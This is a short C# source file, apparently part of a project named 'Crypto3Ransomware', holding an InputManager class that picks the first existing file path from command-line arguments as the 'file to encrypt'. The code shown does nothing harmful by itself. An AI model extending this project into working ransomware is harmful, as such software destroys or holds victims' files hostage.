namespace Crypto3Ransomware;

public class InputManager
{
    private string[] _args;
    public InputManager(string[] args)
    {
        _args = args;
    }

    public string GetFileToEncryptPath()
    {
        foreach (var arg in _args)
        {
            if (File.Exists(arg))
            {
                return arg;
            }
        }
        throw new FileNotFoundException();
    }
}